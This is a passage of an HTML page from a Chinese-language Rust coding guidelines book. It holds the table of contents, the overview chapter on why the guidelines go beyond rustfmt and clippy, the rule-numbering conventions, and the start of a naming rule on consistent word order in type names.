aria-hidden="true">3.20.8.2.</strong> P.UNS.FFI.02 在使用标准库 std::ffi 模块提供的类型时需要仔细查看其文档</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.03.html"><strong aria-hidden="true">3.20.8.3.</strong> P.UNS.FFI.03 当使用来自 C 的指针时，如果该指针需要管理内存，则需要为包装该指针的 Rust 类型实现 Drop 特质</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.04.html"><strong aria-hidden="true">3.20.8.4.</strong> P.UNS.FFI.04 如果一个函数正在跨越 FFi 边界，那么需要处理 Panic</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.05.html"><strong aria-hidden="true">3.20.8.5.</strong> P.UNS.FFI.05 建议使用诸如标准库或 libc crate 所提供的可移植类型别名，而不是特定平台的类型</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.06.html"><strong aria-hidden="true">3.20.8.6.</strong> P.UNS.FFI.06 Rust 和 C 之间传递字符或字符串时需要注意字符串要符合 C-ABI 以及 字符串的编码</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.07.html"><strong aria-hidden="true">3.20.8.7.</strong> P.UNS.FFI.07 不要为任何传出外部的类型实现 Drop</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.08.html"><strong aria-hidden="true">3.20.8.8.</strong> P.UNS.FFI.08 FFi 中要进行合理的错误处理</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.09.html"><strong aria-hidden="true">3.20.8.9.</strong> P.UNS.FFI.09 当 Rust 调用外部 C 函数时，如果可以确认安全，可以通过引用来代替裸指针</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.10.html"><strong aria-hidden="true">3.20.8.10.</strong> P.UNS.FFI.10 当 Rust 函数导出外部函数时，必须从设计上保证被跨线程调用的安全性</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.11.html"><strong aria-hidden="true">3.20.8.11.</strong> P.UNS.FFI.11 如需引用指定为 #[repr(packed)] 内存布局的结构体成员字段要注意合理规避未定义行为</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.12.html"><strong aria-hidden="true">3.20.8.12.</strong> P.UNS.FFI.12 当依赖 C 端传入参数时，需要在文档注释中不变性声明，根据不同的调用场景选择合适的安全抽象方式</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.13.html"><strong aria-hidden="true">3.20.8.13.</strong> P.UNS.FFI.13 自定义数据类型要保证一致的数据布局</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.14.html"><strong aria-hidden="true">3.20.8.14.</strong> P.UNS.FFI.14 在 FFi 中使用的类型应该拥有稳定布局</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.15.html"><strong aria-hidden="true">3.20.8.15.</strong> P.UNS.FFI.15 从外部传入的不健壮类型的外部值要进行检查</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.16.html"><strong aria-hidden="true">3.20.8.16.</strong> P.UNS.FFI.16 给 C 接口传递 Rust 闭包时需要将数据和代码进行分离，并要保证其安全性</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.17.html"><strong aria-hidden="true">3.20.8.17.</strong> P.UNS.FFI.17 当Rust绑定C-API不透明(Opaque)类型时，应该使用指向专用不透明类型的指针而不是c_void指针</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/ffi/P.UNS.FFI.18.html"><strong aria-hidden="true">3.20.8.18.</strong> P.UNS.FFI.18 避免将 trait 对象传递给 C 接口</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/io.html"><strong aria-hidden="true">3.20.9.</strong> I/O</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/io/P.UNS.FIO.01.html"><strong aria-hidden="true">3.20.9.1.</strong> P.UNS.FIO.01 在使用原始句柄的时候，要注意 I/O 安全性</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/unsafe_rust/glossary.html"><strong aria-hidden="true">3.20.10.</strong> Unsafe 代码术语指南</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/no-std.html"><strong aria-hidden="true">3.21.</strong> no-std</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/no-std/P.EMB.01.html"><strong aria-hidden="true">3.21.1.</strong> P.EMB.01 no-std 下必须定义一个Panic行为以确保安全</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/no-std/P.EMB.02.html"><strong aria-hidden="true">3.21.2.</strong> P.EMB.02 no-std 下要确保程序中的类型有正确的内存布局</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/io.html"><strong aria-hidden="true">3.22.</strong> I/O</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/io/P.FIO.01.html"><strong aria-hidden="true">3.22.1.</strong> P.FIO.01 使用 read_to_end/read_to_string方法时注意文件的大小能否一次性读入内存中</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/io/G.FIO.01.html"><strong aria-hidden="true">3.22.2.</strong> G.FIO.01 文件读取建议使用 BufReader/BufWriter 来代替 Reader/Write</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/security.html"><strong aria-hidden="true">3.23.</strong> 信息安全</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/security/P.SEC.01.html"><strong aria-hidden="true">3.23.1.</strong> P.SEC.01 使用第三方库的时候要确保可信的依赖，小心供应链攻击</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/security/G.SEC.01.html"><strong aria-hidden="true">3.23.2.</strong> G.SEC.01 代码中不要出现非法 Unicode 字符，也要防范非法 Unicode 字符</a></li></ol></li><li class="chapter-item "><a href="safe-guides/coding_practice/others.html"><strong aria-hidden="true">3.24.</strong> 其他</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/coding_practice/others/G.OTH.01.html"><strong aria-hidden="true">3.24.1.</strong> G.OTH.01 对于某些场景下不建议使用的方法可以通过配置 clippy.toml 来拒绝</a></li><li class="chapter-item "><a href="safe-guides/coding_practice/others/G.OTH.02.html"><strong aria-hidden="true">3.24.2.</strong> G.OTH.01 使用标准库中对应的方法计算秒级、毫秒级、微秒级的时间</a></li></ol></li></ol></li><li class="chapter-item "><a href="safe-guides/Appendix/toc.html"><strong aria-hidden="true">4.</strong> 附录</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/Appendix/dev_env.html"><strong aria-hidden="true">4.1.</strong> A.开发环境</a></li><li class="chapter-item "><a href="safe-guides/Appendix/test.html"><strong aria-hidden="true">4.2.</strong> B.测试</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/Appendix/test/unit_test.html"><strong aria-hidden="true">4.2.1.</strong> 单元测试</a></li><li class="chapter-item "><a href="safe-guides/Appendix/test/benchmark.html"><strong aria-hidden="true">4.2.2.</strong> 基准测试</a></li><li class="chapter-item "><a href="safe-guides/Appendix/test/fuzz.html"><strong aria-hidden="true">4.2.3.</strong> 模糊测试</a></li></ol></li><li class="chapter-item "><a href="safe-guides/Appendix/terms.html"><strong aria-hidden="true">4.3.</strong> C.术语解释</a></li><li class="chapter-item "><a href="safe-guides/Appendix/templates/intro.html"><strong aria-hidden="true">4.4.</strong> D.模板</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/Appendix/templates/rustfmt.toml.html"><strong aria-hidden="true">4.4.1.</strong> rustfmt 模板</a></li><li class="chapter-item "><a href="safe-guides/Appendix/templates/clippy.toml.html"><strong aria-hidden="true">4.4.2.</strong> clippy 模板</a></li><li class="chapter-item "><a href="safe-guides/Appendix/templates/deny.toml.html"><strong aria-hidden="true">4.4.3.</strong> deny 模板</a></li></ol></li><li class="chapter-item "><a href="safe-guides/Appendix/tools/intro.html"><strong aria-hidden="true">4.5.</strong> E.工具链</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/Appendix/tools/rustfmt.html"><strong aria-hidden="true">4.5.1.</strong> rustfmt</a></li><li class="chapter-item "><a href="safe-guides/Appendix/tools/noisy-clippy.html"><strong aria-hidden="true">4.5.2.</strong> noisy-clippy</a></li><li class="chapter-item "><a href="safe-guides/Appendix/tools/cargo-udeps.html"><strong aria-hidden="true">4.5.3.</strong> cargo-udeps</a></li></ol></li><li class="chapter-item "><a href="safe-guides/Appendix/cheat-sheet/index.html"><strong aria-hidden="true">4.6.</strong> F.Cheat Sheet</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/Appendix/cheat-sheet/Numbers/float.html"><strong aria-hidden="true">4.6.1.</strong> 浮点数</a></li></ol></li><li class="chapter-item "><a href="safe-guides/Appendix/optimizing/intro.html"><strong aria-hidden="true">4.7.</strong> G.优化指南</a></li><li class="chapter-item "><a href="safe-guides/Appendix/rustc-flag.html"><strong aria-hidden="true">4.8.</strong> H.编译参数说明</a></li><li class="chapter-item "><a href="safe-guides/Appendix/best-practice/intro.html"><strong aria-hidden="true">4.9.</strong> I.最佳实践</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="safe-guides/Appendix/best-practice/qa.html"><strong aria-hidden="true">4.9.1.</strong> 初学者常见问题Q&amp;A</a></li><li class="chapter-item "><a href="safe-guides/Appendix/best-practice/tips.html"><strong aria-hidden="true">4.9.2.</strong> Rust 编程技巧</a></li></ol></li><li class="chapter-item "><a href="safe-guides/Appendix/contribution.html"><strong aria-hidden="true">4.10.</strong> J.贡献说明</a></li><li class="chapter-item "><a href="safe-guides/Appendix/old_guidelines.html"><strong aria-hidden="true">4.11.</strong> K.淘汰的规则</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Rust 编码规范 V 1.0 beta</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        <a href="https://github.com/Rust-Coding-Guidelines/rust-coding-guidelines-zh" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="1-概述"><a class="header" href="#1-概述">1. 概述</a></h1>
<h2 id="状态"><a class="header" href="#状态">状态</a></h2>
<ul>
<li>《Rust 编码规范》目前为 V 1.0 beta 试行版，改进内容参考 <a href="./Changelog.html">Changelog</a></li>
</ul>
<h2 id="详细"><a class="header" href="#详细">详细</a></h2>
<ul>
<li><a href="./overview/why.html">1.1 为什么需要 Rust 编码规范</a></li>
<li><a href="./overview/convention.html">1.2 编码规范基本约定</a></li>
</ul>
<h2 id="介绍"><a class="header" href="#介绍">介绍</a></h2>
<p>Rust 语言社区内其实分散着很多编码规范，下面罗列一部分公开信息：</p>
<ul>
<li><a href="https://rust-lang.github.io/api-guidelines/about.html">官方｜Rust API 编写指南</a></li>
<li><a href="https://github.com/rust-dev-tools/fmt-rfcs/blob/master/guide/guide.md">官方 | Rust Style Guide</a></li>
<li><a href="https://rust-lang.github.io/unsafe-code-guidelines/">Rust's Unsafe Code Guidelines Reference</a></li>
<li><a href="https://anssi-fr.github.io/rust-guide">法国国家信息安全局 | Rust 安全（Security）规范</a></li>
<li><a href="https://teaclave.apache.org/docs/rust-guildeline/">Apache Teaclave 安全计算平台 | Rust 开发规范</a></li>
<li><a href="https://github.com/pingcap/style-guide">PingCAP | 编码风格指南（包括 Rust 和 Go 等）</a></li>
<li><a href="https://fuchsia.dev/fuchsia-src/development/languages/rust">Google Fuchsia 操作系统 Rust 开发指南</a></li>
<li><a href="https://github.com/rust-analyzer/rust-analyzer/blob/master/docs/dev/style.md">RustAnalyzer 编码风格指南</a></li>
<li><a href="https://deterministic.space/elegant-apis-in-rust.html">使用 Rust 设计优雅的 API</a></li>
<li><a href="https://michael-f-bryan.github.io/rust-ffi-guide/">Rust FFI 指南</a></li>
</ul>
<p>上面这些除了 Rust 官方和法国国家信息安全局的编码规范之外，其他开源项目的编码规范主要是为了规范贡献者们遵循一个统一的编码风格。</p>
<p>所以，一个通用的，覆盖编码风格和具体编码实践的全面的编码规范，更有助于社区各个开源项目和各大公司参考去制定自己的编码规范。</p>
<p><img src="./img/org.png" alt="org" /></p>
<p>本规范致力于成为统一的 Rust 编码规范，各大公司可以依赖本规范，结合自己的业务领域和团队习惯，形成自己的编码规范，并可以在日常实践中反哺本规范，让本规范更加完善。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="11-为什么需要-rust-编码规范"><a class="header" href="#11-为什么需要-rust-编码规范">1.1 为什么需要 Rust 编码规范</a></h1>
<h2 id="前言"><a class="header" href="#前言">前言</a></h2>
<p>在刚学 Rust 的时候，我赞叹于 Rust 提供的工具之先进性。比如 rustfmt，可以自动格式化代码，clippy 可以帮助你规范代码中写的不地道的地方。它们确实是非常优秀的工具。当时我也认为 Rust 根本不需要像其他语言那样制定编码规范。</p>
<p>但随着对 Rust 越来越深入了解的过程中，我也逐渐发现这些工具的很多不足之处，覆盖的并不全面。比如 rustfmt 配置和使用不当会导致代码错误，而且无法识别 Rust 代码中各种命名的语义；clippy存在一些误报或lint不合理，以及无法覆盖到 Unsafe Rust 等问题。开发者，尤其是新手们，如果长期像使用一个黑盒一样去依赖rustfmt和clippy，但并不去了解其lint背后的原因，只是知其然而无法知其所以然，那在代码质量有一定要求的前提下是无法提升开发效率的。</p>
<p>所以，rutfmt和clippy并不是万能的。我们还需要一个全面且通用的编码规范，并且也能覆盖到像 rustfmt 和 clippy 这样的工具，让广大 Rust 团队通过规范化的原则和规则去了解编写地道 Rust 代码的基本框架，就可以快速落地 Rust ，增强团队间的协作与信任。</p>
<h2 id="rustfmt-和-clippy-的局限性"><a class="header" href="#rustfmt-和-clippy-的局限性">Rustfmt 和 Clippy 的局限性</a></h2>
<h3 id="rustfmt-局限性"><a class="header" href="#rustfmt-局限性">Rustfmt 局限性</a></h3>
<p>Rust 有自动化格式化工具 rustfmt ，可以帮助开发者摆脱手工调整代码格式的工作，提升生产力。但它并不能代替编码规范对 Rust 代码的编码风格进行规范。</p>
<p>rustfmt主要存在以下缺陷：</p>
<ol>
<li>Rust 语言是一门非常注重语义的语言。Rust 中的变量、类型和函数等命名是非常讲究语义的，尤其是所有权语义。rustfmt 工具无法判断代码中命名的语义。这方面利用 Clippy 可以满足部分需求，但是对于开发者来说比较片面。</li>
<li>Rustfmt 如果使用不当或配置不当，会导致问题。因为rustfmt是自动格式化工具，它会自动修改代码，但是它修改的时候并不会编译代码。如果开发者配置自动保存以后自动执行rustfmt，就会导致代码被修改错误，或者，有一些rustfmt 配置选项配置错误，也可能导致代码修改错误。</li>
<li>rustfmt 工具中的配置项都比较零散，大部分开发者不会去了解其每一个配置项的含义。</li>
<li>rustfmt 没有覆盖到代码注释和文档注释的编码规范。</li>
</ol>
<p>综上所述，需要通过提供一个通用的编码规范，让开发者明确地从命名、格式和注释三方面整体上了解 Rust 遵循什么样的编码风格。其中会覆盖 rustfmt 的内容，但并不是机械地将 rustfmt 的规则都一一提取出来，而是对 rustfmt 的规则进行了统一的归类和梳理，方便开发者去理解 rustfmt 中制定的规则，方便团队去制定适合自己的代码风格。</p>
<h3 id="clippy-的局限性"><a class="header" href="#clippy-的局限性">Clippy 的局限性</a></h3>
<p>Clippy是 Rust 的 linter，是 Rust 生态系统中的主要组件之一。它对已开发的代码执行额外的静态检查，报告发现的问题并解释如何修复它们（有时它甚至可以自动修复它们）。使用它能对 Rust 初学者甚至专业人士都带来好处。</p>
<p>但使用 Clippy 并不是意味着它能代替编码规范，它也存在很多缺陷：</p>
<ol>
<li>Clippy 缺乏很多  Unsafe Rust 相关的 lint 检测。Unsafe Rust 是 Rust 非常重要的一部分，需要一个完整的编码规范来覆盖，帮助开发者编写安全的 Unsafe 代码。</li>
<li>Clippy 中的 lint 截止目前有 500多条，而且还有不断增长的趋势，开发者不可能一条条去了解每个 lint，所以需要一个编码规范帮助开发者对lint进行一个梳理归类。</li>
<li>Clippy 中的lint 的建议和分级 （allow/warning/deny）有些争议。其中有些 lint 默认是 allow，但不代表在一些场景下，它就是合理的写法；同样，有些 lint 是 warning，但不代表在一些场景下是不合理的。为此，dtolnay 还特意创造了这个仓库：<a href="https://github.com/dtolnay/noisy-clippy">https://github.com/dtolnay/noisy-clippy</a> ，用于分析社区中crate有多少 Clippy lint 的建议并不符合实际场景，从而达到改进 Clippy 的目的。</li>
</ol>
<p>综上所述，Clippy 虽然是一个十分有用的工具，但它无法替代编码规范。</p>
<h2 id="编码规范作用"><a class="header" href="#编码规范作用">编码规范作用</a></h2>
<p>Rust 编码规范的作用主要是如下方面：</p>
<ol>
<li>遵循 Rust 语言特性，提高代码的可读性、可维护性、健壮性和可移植性。</li>
<li>提高 Unsafe Rust 代码编写的规范性和安全性。</li>
<li>编程规范条款力争系统化、易应用、易检查，帮助开发者提升开发效率。</li>
<li>给开发者一个明确的且全局的视野，在其开发代码的过程中就能遵循好的代码规范，而非等写完代码以后再通过rustfmt和clippy这类的工具，一条一条去修改warning。</li>
<li>规范不等于教程，但是开发人员水平参差不齐，对于一些因为知识盲点而可能导致程序错误的地方，规范也将覆盖到。</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="12-编码规范基本约定"><a class="header" href="#12-编码规范基本约定">1.2 编码规范基本约定</a></h1>
<h2 id="编码规范的内容组织说明"><a class="header" href="#编码规范的内容组织说明">编码规范的内容组织说明</a></h2>
<p><strong>编程规范绝不是为了增加开发者的负担而编写的，目的是为了帮助开发者写出高质量的 Rust 代码。</strong></p>
<p>为了达成这个目的，规范条款分为原则和规则两个类别：<strong>原则</strong> 与 <strong>规则</strong>。</p>
<ul>
<li>
<p>原则，就是编程开发时指导的一个大方向，或是指一类情况。也有少部分原则是 Rust 编译器可检测的情况，但是因为编译器诊断信息比较迷惑，所以增加了原则，帮助开发者去避免这类情况。</p>
</li>
<li>
<p>规则，相对原则来说，更加具体，包含正例和反例来进一步说明。有些规则也会增加例外的情况。规则基本都是可以通过 lint 进行检测的。</p>
</li>
</ul>
<h4 id="规则内容-与-rustfmt-和-clippy-的关系"><a class="header" href="#规则内容-与-rustfmt-和-clippy-的关系">规则内容 与 rustfmt 和 clippy 的关系</a></h4>
<p>规范主要分为两大部分内容：代码风格 和 代码实践。</p>
<p><strong>代码风格</strong></p>
<p>在代码风格中包含代码命名、格式和注释：</p>
<ul>
<li>命名部分，主要是通过 clippy lint 来检查，有些命名规则 clippy lint未提供检测，则需要自定义lint来支持。</li>
<li>格式部分，主要用 rustfmt 来自动修改，编码规范中的规则对 rustfmt 的大部分配置项进行了分类描述，为了方便开发者进行参考，制定自己的配置项。编码规范中也提供了配置模版。</li>
<li>注释部分，其中包括普通注释和文档注释，规则条目通过 rustfmt 和 clippy 合作来进行规范。</li>
</ul>
<p><strong>代码实践</strong></p>
<p>代码实践的内容是按照 Rust 语言特性进行分类，每个语言特性都尽量针对日常编码最佳实践进行总结，提取为一条条的原则和规则，方便开发者进行参考。其中大部分规则都是建议，涉及要求的规则基本都是和安全相关。</p>
<p>这部分内容的规则条目基本都依赖 Clippy lint 去检测，但并非是把 Clippy 500 多条 lint 都一一对应为规则。Clippy lint 中涉及很多技巧类的lint，就没有放到规范中。</p>
<p><strong>规则主要是侧重于通用场景下，代码可读性、维护性、安全性、性能这四方面的考量，它仅仅覆盖一小部分（不到 1/5）clippy lint</strong>。另外还有一些规则是clippy lint没有的，需要自定义lint。</p>
<p>代码实践内容的重点在于 Unsafe Rust 的编码规范，其中编码原则多于规则，并且 Clippy lint 也很少能检测这部分内容。其中要求类的规则更多一些。</p>
<p>希望通过这部分内容，让开发者在编写 Rust 代码过程中，避开一些常见的坑。</p>
<h2 id="编码规范内容约定"><a class="header" href="#编码规范内容约定">编码规范内容约定</a></h2>
<p>通过标题前的编号来标识：</p>
<ul>
<li>标识为<code>P</code>为原则（Principle）。编号方式为<code>P.Element.Number</code>。</li>
<li>标识为<code>G</code>为规则（Guideline）。编号方式为<code>G.Element.Number</code>。</li>
<li>当有子目录时。编号方式为 <code>P.Element.SubElement.Number</code> 或 <code>G.Element.SubElement.Number</code>。</li>
</ul>
<p>Number 从<code>01</code>开始递增。其中 <code>Element</code> 为领域知识中关键元素（本规范中对应的二级目录）的三位英文字母缩略语。（术语参考： <a href="https://wiki.sei.cmu.edu/confluence/display/c/SEI+CERT+C+Coding+Standard">SEI CERT C Coding Standard</a>）</p>
<table><thead><tr><th>Element</th><th>解释</th><th>Element</th><th>解释</th></tr></thead><tbody>
<tr><td>NAM</td><td>命名 (Naming)</td><td>CMT</td><td>注释 (Comment)</td></tr>
<tr><td>FMT</td><td>格式 (Format)</td><td>TYP</td><td>数据类型 (Data Type)</td></tr>
<tr><td>CNS</td><td>常量 (Const)</td><td>VAR</td><td>变量  (Variables)</td></tr>
<tr><td>EXP</td><td>表达式 (Expression)</td><td>CTF</td><td>控制流程 (Control Flow)</td></tr>
<tr><td>REF</td><td>引用 (Reference)</td><td>PTR</td><td>指针  (Pointer)</td></tr>
<tr><td>STR</td><td>字符串 (String)</td><td>INT</td><td>整数 (Integer)</td></tr>
<tr><td>MOD</td><td>模块  (Module)</td><td>CAR</td><td>包管理  (Cargo)</td></tr>
<tr><td>MEM</td><td>内存 (Memory)</td><td>FUD</td><td>函数设计 (Function Design)</td></tr>
<tr><td>MAC</td><td>宏  (Macro)</td><td>STV</td><td>静态变量 (Static Variables)</td></tr>
<tr><td>GEN</td><td>泛型 (Generic)</td><td>TRA</td><td>特质 (Trait)</td></tr>
<tr><td>ASY</td><td>异步 (Async)</td><td>UNS</td><td>非安全 (Unsafe Rust)</td></tr>
<tr><td>SAS</td><td>安全抽象 (Safety Abstract)</td><td>FFI</td><td>外部函数调用接口 ( Foreign Function Interface )</td></tr>
<tr><td>LAY</td><td>内存布局 (Layout)</td><td>ERR</td><td>错误处理 (Error Handle)</td></tr>
<tr><td>CLT</td><td>集合  (Collection)</td><td>MTH</td><td>多线程 (Multi Threads)</td></tr>
<tr><td>EMB</td><td>嵌入式Rust (Embedded Rust)</td><td>FIO</td><td>输入输出 (In/Out)</td></tr>
<tr><td>SEC</td><td>信息安全 (Security)</td><td>SPT</td><td>智能指针 (Smart Pointer)</td></tr>
<tr><td>UNT</td><td>单元类型 (Unit)</td><td>BOL</td><td>布尔 (Bool)</td></tr>
<tr><td>CHR</td><td>字符类型 (Char)</td><td>FLT</td><td>浮点数 (Float)</td></tr>
<tr><td>SLC</td><td>切片类型 (Slice)</td><td>TUP</td><td>元组 (Tuple)</td></tr>
<tr><td>ARR</td><td>固定长度数组类型 (Array)</td><td>VEC</td><td>动态长度数组 (Vector)</td></tr>
<tr><td>SCT</td><td>结构体 (Struct)</td><td>ENM</td><td>枚举体 (Enum)</td></tr>
<tr><td>UNI</td><td>联合体 (Union)</td><td>BLN</td><td>标准库内置（BuiltIn）</td></tr>
<tr><td>OBJ</td><td>Trait 对象 (Trait Object)</td><td>LFT</td><td>生命周期 (Lifetime)</td></tr>
<tr><td>BOX</td><td><code>Box&lt;T&gt;</code> 类型</td><td>DRP</td><td>析构函数 (Drop)</td></tr>
<tr><td>DCL</td><td>声明宏 (Declarative)</td><td>PRO</td><td>过程宏 (Procedural)</td></tr>
<tr><td>LCK</td><td>锁同步 (Lock)</td><td>LKF</td><td>无锁 (Lock Free)</td></tr>
<tr><td>CGN</td><td>代码生成（Code Generation）</td><td>OTH</td><td>其他 (Ohters)</td></tr>
</tbody></table>
<h2 id="引用代码开源许可证说明"><a class="header" href="#引用代码开源许可证说明">引用代码开源许可证说明</a></h2>
<p>本规范中引用外部代码，均满足 <code>MIT/Apache/Mozilla public licenses</code> 开源许可证！</p>
<h2 id="特别鸣谢"><a class="header" href="#特别鸣谢">特别鸣谢</a></h2>
<p>本指南参考《华为 C 语言编程指南 V 1.0》，感谢华为 开源能力中心 提供编程指南规范协助！</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="2-代码风格"><a class="header" href="#2-代码风格">2. 代码风格</a></h1>
<p>代码风格包含标识符的命名风格、排版与格式风格、注释风格等。一致的编码习惯与风格，可以提高代码可读性和可维护性。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="21-命名"><a class="header" href="#21-命名">2.1 命名</a></h1>
<p>好的命名风格能让我们快速地了解某个名字代表的含义（类型、变量、函数、常量、宏等），甚至能凸显其在整个代码上下文中的语义。命名管理对提升代码的可读性和维护性相当重要。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pnam01--同一个crate中标识符的命名规则应该使用统一的词序"><a class="header" href="#pnam01--同一个crate中标识符的命名规则应该使用统一的词序">P.NAM.01  同一个crate中标识符的命名规则应该使用统一的词序</a></h2>
<p><strong>【描述】</strong></p>
<p>具体选择什么样的词序并不重要，但务必要保证同一个 crate 内词序的一致性。
若提供与标准库中相似功能的东西时，也要与标准库名称的词性顺序一致.</p>
<blockquote>
<p>拿错误类型来举个例子：</p>
<p>当crate中类型名称都按照 <strong>动词-宾语-error</strong> 这样的顺序来命名错误类型时，如果要增加新的错误类型，则也需要按同样的词序来增加。</p>
</blockquote>
<p>以下是来自标准库的处理错误的一些类型示例：</p>
<ul>
<li><a href="https://doc.rust-lang.org/std/env/struct.JoinPathsError.html"><code>JoinPathsError</code></a></li>
<li><a href="https://doc.rust-lang.org/std/str/struct.ParseBoolError.html"><code>ParseBoolError</code></a></li>
<li><a href="https://doc.rust-lang.org/std/char/struct.ParseCharError.html"><code>ParseCharError</code></a></li>
<li><a href="https://doc.rust-lang.org/std/num/struct.ParseFloatError.html"><code>ParseFloatError</code></a></li>
<li><a href="https://doc.rust-lang.org/std/num/struct.ParseIntError.html"><code>ParseIntError</code></a></li>
<li><a href="https://doc.rust-lang.org/std/sync/mpsc/enum.RecvTimeoutError.html"><code>RecvTimeoutError</code></a></li>
<li><a href="https://doc.rust-lang.org/std/path/struct.StripPrefixError.html"><code>StripPrefixError</code></a></li>
</ul>
<p>如果你想新增和标准库相似的错误类型，比如“解析地址错误”类型，为了保持词性一致，应该使用<code>ParseAddrError</code> 名称，而不是<code>AddrParseError</code>。</p>
<blockquote>
<p>说明：现在标准库文档中 net模块解析地址错误类型是 <code>AddrParseError</code>，其实和标准库中大部分错误类型遵循的 &quot;动-宾-Error&quot; 词序没有保持一致，所以它是一个特例。</p>
</blockquote>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合：与标准库错误类型词序 &quot;动-宾-Error&quot;  不一致，应该为 ParseAddrError
struct AddrParseError {}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
